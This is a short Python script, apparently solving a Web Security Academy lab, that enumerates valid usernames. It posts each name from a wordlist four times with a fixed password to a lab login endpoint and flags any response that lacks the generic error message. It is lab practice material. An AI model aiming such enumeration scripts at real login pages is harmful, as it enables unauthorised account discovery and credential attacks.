import requests
import re

usernames = open("usernames.txt","r")

for i in usernames:
	for j in range(0,4):
		data = {"username":i.strip(),"password":"ella"}
		respuesta = requests.post("https://0ae80052037de04d839cfaf5006d008b.web-security-academy.net/login", data=data )
		coincidencia = re.findall("Invalid username or password.",respuesta.text)
		if coincidencia == []:
			print("Username encontrado: "+i.strip())
